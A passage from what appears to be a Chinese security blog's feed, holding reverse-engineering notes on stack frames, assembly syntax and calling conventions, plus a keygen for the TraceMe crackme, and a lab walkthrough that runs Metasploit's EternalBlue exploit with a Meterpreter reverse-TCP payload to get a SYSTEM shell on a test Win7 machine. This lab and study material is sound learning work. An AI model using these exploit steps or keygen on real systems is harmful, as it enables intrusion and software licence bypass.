alt="YBwSw8.png"><br>相应的函数栈帧:</p><table><thead><tr><th><strong>ESP</strong></th><th>0022FF38</th><th>0022FFF0</th></tr></thead><tbody><tr><td><strong>c</strong></td><td><strong>0022FF3C</strong></td><td><strong>00000003</strong></td></tr><tr><td><strong>b</strong></td><td><strong>0022FF40</strong></td><td><strong>00000002</strong></td></tr><tr><td><strong>a</strong></td><td><strong>0022FF44</strong></td><td><strong>00000001</strong></td></tr><tr><td><strong>EBP</strong></td><td><strong>0022FF48</strong></td><td><strong>0022FF58</strong></td></tr><tr><td><strong>返回地址</strong></td><td><strong>0022FF4C</strong></td><td><strong>00401406</strong></td></tr></tbody></table><p>当程序运行至0x4013F4（f2()函数参数均已入栈）时，此时栈布局:</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwAln.png" alt="YBwAln.png"><br>对应的函数栈帧：</p><table><thead><tr><th>ESP（printf第一个参数）</th><th>0022FF20</th><th>00403064</th></tr></thead><tbody><tr><td><strong>f2 a</strong></td><td><strong>0022FF24</strong></td><td><strong>00000003</strong></td></tr><tr><td><strong>f2 b</strong></td><td><strong>0022FF28</strong></td><td><strong>0022FFF0</strong></td></tr><tr><td><strong>f2 c</strong></td><td><strong>0022FF2C</strong></td><td><strong>00401950</strong></td></tr><tr><td></td><td><strong>0022FF30</strong></td><td><strong>77C04E42</strong></td></tr><tr><td></td><td><strong>0022FF34</strong></td><td><strong>00401950</strong></td></tr><tr><td></td><td><strong>0022FF38</strong></td><td><strong>0022FFF0</strong></td></tr><tr><td><strong>f1 c</strong></td><td><strong>0022FF3C</strong></td><td><strong>00000003</strong></td></tr><tr><td><strong>f1 b</strong></td><td><strong>0022FF40</strong></td><td><strong>00000002</strong></td></tr><tr><td><strong>f1 a</strong></td><td><strong>0022FF44</strong></td><td><strong>00000001</strong></td></tr><tr><td><strong>EBP</strong></td><td><strong>0022FF48</strong></td><td><strong>0022FF58</strong></td></tr><tr><td><strong>返回地址</strong></td><td><strong>0022FF4C</strong></td><td><strong>0040140B</strong></td></tr></tbody></table><p>+++</p><h2 id="程序三、关于AT-amp-T和Intel"><a href="#程序三、关于AT-amp-T和Intel" class="headerlink" title="程序三、关于AT&amp;T和Intel"></a>程序三、关于AT&amp;T和Intel</h2><h3 id="程序源码-2"><a href="#程序源码-2" class="headerlink" title="程序源码"></a>程序源码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Hello,World\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在kali里创建test0.c文件；</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwEyq.png" alt="YBwEyq.png"></p><h3 id="AT-amp-T语法"><a href="#AT-amp-T语法" class="headerlink" title="AT&amp;T语法"></a>AT&amp;T语法</h3><p><img src="https://s1.ax1x.com/2020/05/14/YBwemV.png" alt="YBwemV.png"></p><h3 id="Intel语法"><a href="#Intel语法" class="headerlink" title="Intel语法"></a>Intel语法</h3><p><img src="https://s1.ax1x.com/2020/05/14/YBwVO0.png" alt="YBwVO0.png"><br>+++</p><h2 id="程序四、linux下64，32"><a href="#程序四、linux下64，32" class="headerlink" title="程序四、linux下64，32"></a>程序四、linux下64，32</h2><h3 id="程序源码-3"><a href="#程序源码-3" class="headerlink" title="程序源码"></a>程序源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_function</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c,<span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">10</span>];</span><br><span class="line">flag=<span class="number">31337</span>;</span><br><span class="line">buffer[<span class="number">0</span>]=<span class="string">'A'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test_function(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>64位版本，可看出<strong>main</strong>函数中1,2,3,4分别存储在寄存器<strong>edi,esi,edx,ecx</strong>中；<strong>test_function</strong>函数中通过上述四个寄存器将值存储在栈中;</p><p><img src="https://s1.ax1x.com/2020/05/14/YDiGxP.png" alt="YDiGxP.png"><br>[11]:()<br><img src="https://s1.ax1x.com/2020/05/14/YDi82t.png" alt="YDi82t.png"><br>+++</p><p>执行至<strong>0x55555555515b</strong>处,即test_function函数；</p><p><img src="https://s1.ax1x.com/2020/05/14/YDiYKf.png" alt="YDiYKf.png"><br>进入test_function函数内部；</p><p><a href="https://imgchr.com/i/YDiBPs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/14/YDiBPs.png" alt="YDiBPs.png"></a><br>执行至<strong>pop</strong>操作处：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDiNqS.png" alt="YDiNqS.png"><br>此时的栈：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDiaVg.png" alt="YDiaVg.png"><br>对应的栈帧如下表：</p><table><thead><tr><th>rsp</th><th>e1b0</th><th>0x00007fffffffe1c0</th></tr></thead><tbody><tr><td></td><td><strong>e1c0</strong></td><td><strong>0x0000555555555170</strong></td></tr><tr><td><strong>最后一字节为buffer<a href="()">0</a></strong></td><td><strong>e1d0</strong></td><td><strong>0x0000000000000000</strong></td></tr><tr><td></td><td><strong>e1e0</strong></td><td><strong>0x0000000100040000</strong></td></tr><tr><td><strong>rbp</strong></td><td><strong>e1f0</strong></td><td><strong>0x0000000000000000</strong></td></tr></tbody></table><p>+++</p><h2 id="程序5、TraceMe-exe"><a href="#程序5、TraceMe-exe" class="headerlink" title="程序5、TraceMe.exe"></a>程序5、TraceMe.exe</h2><h3 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h3><p>根据<strong>GetDlgItemTextA</strong>函数找到程序的关键代码处：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDi38I.png" alt="YDi38I.png"><br>输入用户名1234567,序列号08173144;</p><p><img src="https://s1.ax1x.com/2020/05/14/YDiw5j.png" alt="YDiw5j.png"><br>发现eax保存序列号长度，ebx保存用户名长度:</p><p><img src="https://s1.ax1x.com/2020/05/14/YDidaQ.png" alt="YDidaQ.png"><br>test al,al判断用户名第一字节是否为空，空的话跳转。</p><p>分析后得知0X0040138F为跳转判断是否输入正确，如下代码：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDcgC6.png" alt="YDcgC6.png"><br>可以直接按照00401347——00401378写出注册机；</p><p>+++</p><p>序列号生成算法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">15</span>];</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line"><span class="keyword">char</span> arr[]=&#123;<span class="number">0x0c</span>,<span class="number">0x0a</span>,<span class="number">0x13</span>,<span class="number">0x09</span>,<span class="number">0x0c</span>,<span class="number">0x0b</span>,<span class="number">0x0a</span>,<span class="number">0x0b</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">3</span>,j=<span class="number">0</span>;j&lt;len;i++,j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j&gt;<span class="number">7</span>)</span><br><span class="line">j=<span class="number">0</span>;</span><br><span class="line">r+=s[i]*arr[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是以用户名1234567，得到序列号：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDcsER.png" alt="YDcsER.png"><br>Check:</p><p><img src="https://s1.ax1x.com/2020/05/14/YDchKe.png" alt="YDchKe.png"><br>成功！</p><p>+++</p><h2 id="程序六、调用stdcall、fastcall…"><a href="#程序六、调用stdcall、fastcall…" class="headerlink" title="程序六、调用stdcall、fastcall…"></a>程序六、调用<code>stdcall</code>、<code>fastcall</code>…</h2><h3 id="1-stdcall"><a href="#1-stdcall" class="headerlink" title="1.stdcall"></a>1.stdcall</h3><p>示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __<span class="function">stdcall <span class="title">demo_cdecl</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z,<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum=x+y+z+w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">demo_cdecl(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>汇编代码：</p><blockquote><p>x32dbg</p></blockquote><p><img src="https://s1.ax1x.com/2020/05/14/YDcyU1.png" alt="YDcyU1.png"></p><p>被调用方调整栈帧：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDc64x.png" alt="YDc64x.png"></p><h3 id="2-fastcall"><a href="#2-fastcall" class="headerlink" title="2.fastcall"></a>2.fastcall</h3><p>示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">demo_cdecl</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z,<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum=x+y+z+w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">demo_cdecl(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>汇编代码：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDcRgO.png" alt="YDcRgO.png"></p><p>被调用方调整栈帧：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDcWvD.png" alt="YDcWvD.png"><br>+++</p><h3 id="3-cdecl"><a href="#3-cdecl" class="headerlink" title="3.cdecl"></a>3.cdecl</h3><p>示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">demo_cdecl</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z,<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum=x+y+z+w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">demo_cdecl(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>汇编代码：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDc4DH.png" alt="YDc4DH.png"></p><p>被调用方调整栈帧：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDcDb9.png" alt="YDcDb9.png"><br>+++</p><h3 id="4-thiscall"><a href="#4-thiscall" class="headerlink" title="4.thiscall"></a>4.thiscall</h3><p>示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CSum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CSum sum;</span><br><span class="line">sum.Add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>汇编代码：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDc28K.png" alt="YDc28K.png"></p><p>被调用方调整栈帧：</p><p><img src="https://s1.ax1x.com/2020/05/14/YD7pCQ.png" alt="YD7pCQ.png"><br>+++</p><h3 id="5-64位操作系统"><a href="#5-64位操作系统" class="headerlink" title="5.64位操作系统"></a>5.64位操作系统</h3><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> n1,<span class="keyword">int</span> n2,<span class="keyword">int</span> n3,<span class="keyword">int</span> n4,<span class="keyword">int</span> n5,<span class="keyword">int</span> n6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n1+n2+n3+n4+n5+n6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\r\n"</span>,Add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>Main函数：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDTLut.png" alt="YDTLut.png"></p><p>Add函数：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDTz4g.png" alt="YDTz4g.png"></p><p>+++</p><h3 id="6-64位gcc"><a href="#6-64位gcc" class="headerlink" title="6.64位gcc"></a>6.64位gcc</h3><p>main函数，6个参数从左向右放入寄存器:<strong>rdi,rsi,rdx,rcx,r8,r9</strong></p><p><img src="https://s1.ax1x.com/2020/05/14/YDTvE8.png" alt="YDTvE8.png"></p><p>Add函数：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDTxUS.png" alt="YDTxUS.png"></p><h3 id="7-虚函数调用"><a href="#7-虚函数调用" class="headerlink" title="7.虚函数调用"></a>7.虚函数调用</h3><p>实例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CSum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">Sub</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a-b;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CSum* pCSum=<span class="keyword">new</span> CSum;</span><br><span class="line">    pCSum-&gt;Add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    pCSum-&gt;Sub(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><p>Main函数汇编：</p><p><img src="https://s1.ax1x.com/2020/05/14/YDTXHf.png" alt="YDTXHf.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;程序一、字节序&quot;&gt;&lt;a href=&quot;#程序一、字节序&quot; class=&quot;headerlink&quot; title=&quot;程序一、字节序&quot;&gt;&lt;/a&gt;程序一、字节序&lt;/h2&gt;&lt;h3 id=&quot;程序源码&quot;&gt;&lt;a href=&quot;#程序源码&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="逆向" scheme="https://singlemindedt.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>利用永恒之蓝获取meterpretershell</title>
    <link href="https://singlemindedt.github.io/2020/05/10/%E5%88%A9%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E8%8E%B7%E5%8F%96meterpretershell/"/>
    <id>https://singlemindedt.github.io/2020/05/10/利用永恒之蓝获取meterpretershell/</id>
    <published>2020-05-10T11:49:35.000Z</published>
    <updated>2020-05-11T08:24:25.408Z</updated>
    
    <content type="html"><![CDATA[<p><strong>实验环境：</strong></p><p>攻击机：Kali（192.168.40.128）</p><p>靶机：Win7（192.168.40.142）</p><p>+++</p><p><strong>攻击过程：</strong></p><ol><li>开启msf</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJeXoq.png" alt="YJeXoq.png"></p><ol start="2"><li>情报搜集，首先确定目标是否开放445端口，漏洞Ms17-010是否存在</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap探测主机信息：nmap -sV 192.168.40.142</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJeOwn.png" alt="YJeOwn.png"></p><p>445端口开放，目的主机为windows7系统，推测存在ms17-010漏洞;</p><ol start="3"><li>利用msf的辅助模块auxiliary进行漏洞验证</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJexYV.png" alt="YJexYV.png"></p><p>搜索相关漏洞模块得到5条结果，有远程Windows命令执行、远程Windows内核损坏、代码执行等，此处使用<code>auxiliary/scanner/smb/smb_ms17_010</code> 进行验证；</p><p>配置基本信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span>  rhost  192.168.40.142</span><br><span class="line"><span class="built_in">set</span>  rport   445</span><br></pre></td></tr></table></figure><p>运行探测漏洞是否存在：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJebLj.png" alt="YJebLj.png"></p><p>根据结果，存在该漏洞。</p><ol start="4"><li>渗透攻击</li></ol><p>使用渗透攻击（exploit）模块；</p><ul><li>设置攻击目标地址+端口、本机地址</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use  exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  rhost  192.168.40.142</span><br><span class="line"><span class="built_in">set</span>  rport   445</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.40.128</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJeHyQ.png" alt="YJeHyQ.png"></p><ul><li>设置payload</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  payload   windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJeTSS.png" alt="YJeTSS.png"></p><ul><li>查看配置完整性</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJezWT.png" alt="YJezWT.png"></p><p>在Exploit targets中可看到win7和server 2008 r2都适用；</p><ul><li>攻击</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJe7Qg.png" alt="YJe7Qg.png"></p><p>可以看到，直接得到了靶机system权限，并给出了<strong>shell</strong>界面。</p><p>+++</p><p>再回头看看我们的payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  payload   windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>目的是进入<strong>meterpreter</strong>模式，但是结果并不是这样。检查配置后，发现原因：</p><blockquote><p>Metasploit中的扫描器和大部分的其他辅助模块使用RHOSTS选项而不是RHOST</p></blockquote><p>将配置部分中<code>rhost</code>改为<code>rhosts</code>,开始攻击成功进入<strong>meterpreter</strong>模式：</p><p><img src="https://s1.ax1x.com/2020/05/11/YJevF0.png" alt="YJevF0.png"></p><p>+++</p><ol start="5"><li>查看此用户权限</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/11/YJeLes.png" alt="YJeLes.png"></p><p>如图，已经获得<code>NT AUTHORITY\SYSTEM</code>权限。</p><p>+++</p><blockquote><p><strong>Meterpreter</strong>: </p><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</p></blockquote><p>+++</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;实验环境：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;攻击机：Kali（192.168.40.128）&lt;/p&gt;
&lt;p&gt;靶机：Win7（192.168.40.142）&lt;/p&gt;
&lt;p&gt;+++&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击过程：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;
      
    
    </summary>
    
    
      <category term="Demo" scheme="https://singlemindedt.github.io/tags/Demo/"/>
    
      <category term="渗透" scheme="https://singlemindedt.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHP-Audit-Labs</title>
    <link href="https://singlemindedt.github.io/2020/05/03/PHP-Audit-Labs/"/>
    <id>https://singlemindedt.github.io/2020/05/03/PHP-Audit-Labs/</id>
    <published>2020-05-03T00:45:59.000Z</published>
    <updated>2020-05-10T09:03:01.301Z</updated>
    
